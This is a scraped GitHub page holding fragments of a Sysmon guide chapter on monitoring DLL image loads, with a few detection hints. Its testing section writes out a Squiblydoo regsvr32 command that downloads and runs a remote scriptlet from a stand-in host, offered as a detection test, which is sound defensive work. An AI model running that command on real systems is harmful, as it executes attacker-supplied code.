...
[Skip to content](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md) to refresh your session.Dismiss alert
...
[History](https://github.com/trustedsec/SysmonCommunityGuide/commits/master/chapters/image-loading.md)

Open commit details

[View commit history for this file.](https://github.com/trustedsec/SysmonCommunityGuide/commits/master/chapters/image-loading.md) History

286 lines (210 loc) · 13.9 KB
...
[Raw](https://github.com/trustedsec/SysmonCommunityGuide/raw/refs/heads/master/chapters/image-loading.md)
...
[Permalink: Image Loading](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#image-loading)
...
[Permalink: Understanding the Volume Challenge](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#understanding-the-volume-challenge)
...
[Permalink: Detection Value and Use Cases](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#detection-value-and-use-cases)
...
[Permalink: Configuration Philosophy: Targeted Includes Only](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#configuration-philosophy-targeted-includes-only)
...
[Permalink: High-Value DLLs to Monitor](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#high-value-dlls-to-monitor)
...
- DLLs loaded from user-writable directories (C:\\Users\ _, C:\\ProgramData\_, C:\\Windows\\Temp\\\*)
- DLLs with suspicious names or no metadata
- Known malicious DLL hashes from threat intelligence

## Configuration Examples

[Permalink: Configuration Examples](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#configuration-examples)
...
[Permalink: What to Investigate](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#what-to-investigate)
...
[Permalink: Common False Positives and Mitigation](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#common-false-positives-and-mitigation)
...
[Permalink: Performance Considerations](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#performance-considerations)
...
[Permalink: Testing and Validation](https://github.com/trustedsec/SysmonCommunityGuide/blob/master/chapters/image-loading.md#testing-and-validation)
...
3. **Squiblydoo Simulation**: Test regsvr32 /u /s /i: [http://example.com/payload.sct](http://example.com/payload.sct) scrobj.dll technique
